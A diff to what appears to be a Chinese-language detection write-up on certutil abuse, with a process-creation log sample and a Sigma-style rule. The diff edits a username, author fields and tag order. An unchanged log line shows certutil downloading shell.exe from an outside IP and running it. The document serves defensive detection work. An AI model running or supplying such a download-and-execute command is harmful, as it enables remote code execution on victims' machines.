@@ -87,7 +87,7 @@
   FileVersion: 6.1.7600.16385
   Description: CertUtil.exe
   CommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:8000/shell.exe shell.exe & shell.exe
-  User: <domain>\12306Br0
+  User: <domain>\0x783kb
   IntegrityLevel: Medium
   ```
 - **Windows安全日志（事件ID 4688，启用命令行记录）**：
@@ -134,12 +134,14 @@
    references:
      - https://attack.mitre.org/techniques/T1059/
      - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+   author: 0x783kb
+   date: 2023/04/12
    tags:
      - attack.execution
      - attack.defense_evasion
      - attack.t1059
-     - attack.t1140
      - attack.t1105
+     - attack.t1140
    logsource:
      category: process_creation
      product: windows
